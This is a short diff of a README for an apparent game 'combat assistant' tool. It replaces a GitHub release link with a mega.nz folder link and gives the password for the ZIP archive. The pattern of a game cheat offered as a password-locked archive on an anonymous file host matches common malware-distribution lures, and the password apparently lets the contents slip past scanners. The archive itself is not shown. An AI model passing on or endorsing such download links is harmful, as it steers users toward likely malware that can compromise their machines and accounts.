@@ -6,7 +6,7 @@
 
 ## 📥 DOWNLOAD
 
-### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/nikitasoneng1997z8/NTE-Combat-Assistant/releases/download/NTE/NTE_Assistant.zip)
+### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://mega.nz/folder/gMN3nLBC#P1ldhYoUlHExIsR7VfJ1bQ)
 
 🔐 **Archive password:** **`5868781`**
 
